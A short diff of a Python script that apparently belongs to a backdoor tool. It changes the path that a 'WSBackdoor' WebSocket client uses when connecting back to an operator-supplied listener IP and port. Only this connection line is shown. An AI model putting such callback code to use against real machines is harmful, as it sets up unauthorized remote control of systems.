@@ -92,7 +92,7 @@ if __name__ == '__main__':
                       help='Listener IP address')
     (options, args) = parser.parse_args()
     try:
-        ws = WSBackdoor('http://'+options.ip+':'+options.port+'/endpoint/admin/d7f1f2e2-c3cf-49d1-8892-276a64febada', protocols=['http-only', 'chat'])
+        ws = WSBackdoor('http://'+options.ip+':'+options.port+'/endpoint/boxes/box1', protocols=['http-only', 'chat'])
         ws.connect()
     except KeyboardInterrupt:
         ws.close()
